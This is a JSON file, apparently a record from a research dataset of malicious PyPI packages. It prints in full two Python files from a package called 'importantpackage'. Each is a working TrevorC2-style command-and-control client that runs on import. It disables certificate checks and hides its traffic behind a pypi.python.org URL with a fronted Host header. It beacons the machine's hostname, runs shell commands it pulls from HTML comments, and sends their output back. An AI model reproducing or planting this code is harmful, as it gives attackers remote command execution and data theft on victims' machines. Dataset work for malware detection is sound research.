[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/importantpackage-0.2.3/importantpackage-0.2.3/importantpackage/program.py",
    "malicious_code": "# Malicious imports and constants\nimport datetime\nfrom urllib import request\nimport ssl\nimport random\nimport base64\nimport time\nimport subprocess\nimport platform\nimport json\nimport sys\n\nSITE_URL = (\"https://pypi.python.org\")\nROOT_PATH_QUERY = (\"/\")\nSITE_PATH_QUERY = (\"/images\")\nQUERY_STRING = (\"guid=\")\nSTUB = (\"oldcss=\")\ntime_interval1 = 2\ntime_interval2 = 8\nHOST_HEADER = (\"psec.forward.io.global.prod.fastly.net\")\nminutes_from_now = 5\nminutes_until_expiry = datetime.datetime.now() + datetime.timedelta(minutes = minutes_from_now)\n\ndef not_yet_expired():\n    return datetime.datetime.now() <= minutes_until_expiry\n\nclass Request:\n    def __init__(self):\n        self.ctx = ssl.create_default_context()\n        self.ctx.check_hostname = False\n        self.ctx.verify_mode = ssl.CERT_NONE\n        self.cookie_processor = request.HTTPCookieProcessor()\n\n    def get(self, url):\n        r = request.Request(url, headers = {'Host': HOST_HEADER})\n        opener = request.build_opener(self.cookie_processor)\n        res = opener.open(r, timeout = 5)\n        return res.read()\n\n    def post(self, url, data):\n        data = json.dumps({\"output\": data})\n        encoded = base64.urlsafe_b64encode(data.encode(\"utf-8\"))\n        r = request.Request(url, data = encoded, headers = {'Host': HOST_HEADER})\n        opener = request.build_opener(self.cookie_processor)\n        res = opener.open(r, timeout = 5)\n        return res.read()\n\ndef random_interval(time_interval1, time_interval2):\n    return random.randint(time_interval1, time_interval2)\n\nhostname = platform.node()\nreq = Request()\n\ndef connect_trevor():\n    while not_yet_expired():\n        time.sleep(1)\n        try:\n            hostname_send  = (\"magic_hostname=\" + hostname).encode('utf-8')\n            hostname_send = str(base64.b64encode(hostname_send).decode('utf-8'))\n            html = req.get(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING + hostname_send)\n            print(html)\n            break\n        except Exception as error:\n            if \"Connection refused\" in str(error):\n                print(str(error))\n                pass\n            else:\n                print(\"[!] Something went wrong in connecting, printing error: \" + str(error))\n\nconnect_trevor()\n\nwhile not_yet_expired():\n    try:\n        time.sleep(random_interval(time_interval1, time_interval2))\n        html = req.get(SITE_URL + ROOT_PATH_QUERY)\n        parse = html.decode().split(\"<!-- %s\" % (STUB))[1].split(\"-->\")[0]\n        parse = parse.replace(\"'\", \"\")\n        parse = parse.replace('\"', \"\")\n        if parse == \"nothing\": pass\n        else:\n            if hostname in parse:\n                parse = parse.split(hostname + \"::::\")[1]\n                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                stdout_value = proc.communicate()[0]\n                stdout_value = (hostname + \"::::\" + str(stdout_value)).encode('utf-8')\n                stdout_value = base64.b64encode(stdout_value).decode('utf-8')\n                html = req.post(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING, data = stdout_value)\n                time.sleep(random_interval(time_interval1, time_interval2))\n    except Exception as error:\n        if \"Connection refused\" in str(error):\n            connect_trevor()\n        else:\n            print(\"[!] Something went wrong in polling, printing error: \" + str(error))\n    except KeyboardInterrupt:\n        print (\"\\n[!] Exiting TrevorC2 Client...\")\n        sys.exit()\n"
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/importantpackage-0.2.3/importantpackage-0.2.3/importantpackage/__init__.py",
    "malicious_code": "# Malicious imports and constants\nimport datetime\nimport ssl\nimport random\nimport base64\nimport time\nimport subprocess\nimport platform\nimport json\nfrom urllib import request\n\nSITE_URL = (\"https://pypi.python.org\")\nROOT_PATH_QUERY = (\"/\")\nSITE_PATH_QUERY = (\"/images\")\nQUERY_STRING = (\"guid=\")\nSTUB = (\"oldcss=\")\ntime_interval1 = 2\ntime_interval2 = 8\nHOST_HEADER = (\"psec.forward.io.global.prod.fastly.net\")\nminutes_from_now = 5\nminutes_until_expiry = datetime.datetime.now() + datetime.timedelta(minutes = minutes_from_now)\n\n# Expiry check\n\ndef not_yet_expired():\n    return datetime.datetime.now() <= minutes_until_expiry\n\nHOST_ALIVE = True\n\n# HTTP request wrapper with SSL context disabling verification\nclass Request:\n    def __init__(self):\n        self.ctx = ssl.create_default_context()\n        self.ctx.check_hostname = False\n        self.ctx.verify_mode = ssl.CERT_NONE\n        self.cookie_processor = request.HTTPCookieProcessor()\n\n    def get(self, url):\n        try:\n            r = request.Request(url, headers = {'Host': HOST_HEADER})\n            opener = request.build_opener(self.cookie_processor)\n            res = opener.open(r, timeout = 5)\n            return res.read()\n        except:\n            global HOST_ALIVE\n            HOST_ALIVE = False\n            return \"dead\"\n\n    def post(self, url, data):\n        try:\n            data = json.dumps({\"output\": data})\n            encoded = base64.urlsafe_b64encode(data.encode(\"utf-8\"))\n            r = request.Request(url, data = encoded, headers = {'Host': HOST_HEADER})\n            opener = request.build_opener(self.cookie_processor)\n            res = opener.open(r, timeout = 5)\n            return res.read()\n        except:\n            global HOST_ALIVE\n            HOST_ALIVE = False\n            return \"dead\"\n\n# Random interval for C2 communication\ndef random_interval(time_interval1, time_interval2):\n    return random.randint(time_interval1, time_interval2)\n\nhostname = platform.node()\nreq = Request()\n\ndef connect_trevor():\n    # Register asset with C2\n    while not_yet_expired() and HOST_ALIVE:\n        time.sleep(1)\n        try:\n            hostname_send  = (\"magic_hostname=\" + hostname).encode('utf-8')\n            hostname_send = str(base64.b64encode(hostname_send).decode('utf-8'))\n            html = req.get(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING + hostname_send)\n            print(html)\n            break\n        except Exception as error:\n            if \"Connection refused\" in str(error):\n                print(str(error))\n                pass\n            else:\n                print(\"[!] Something went wrong in connecting, printing error: \" + str(error))\n\nconnect_trevor()\n\n# Main C2 loop\nwhile not_yet_expired() and HOST_ALIVE:\n    try:\n        time.sleep(random_interval(time_interval1, time_interval2))\n        html = req.get(SITE_URL + ROOT_PATH_QUERY)\n        if html == \"dead\": HOST_ALIVE = False\n        # Parse C2 command from HTML comment\n        parse = html.decode().split(\"<!-- %s\" % (STUB))[1].split(\"-->\")[0]\n        parse = parse.replace(\"'\", \"\")\n        parse = parse.replace('\"', \"\")\n        if parse == \"nothing\": pass\n        else:\n            if hostname in parse:\n                parse = parse.split(hostname + \"::::\")[1]\n                # Execute received command\n                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                stdout_value = proc.communicate()[0]\n                stdout_value = (hostname + \"::::\" + str(stdout_value)).encode('utf-8')\n                stdout_value = base64.b64encode(stdout_value).decode('utf-8')\n                # Exfiltrate command output to C2\n                html = req.post(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING, data = stdout_value)\n                time.sleep(random_interval(time_interval1, time_interval2))\n    except Exception as error:\n        if \"Connection refused\" in str(error):\n            connect_trevor()\n        else:\n            print(\"[!] Something went wrong in polling, printing error: \" + str(error))\n    except KeyboardInterrupt:\n        print (\"\\n[!] Exiting TrevorC2 Client...\")\n        sys.exit()\n"
  }
]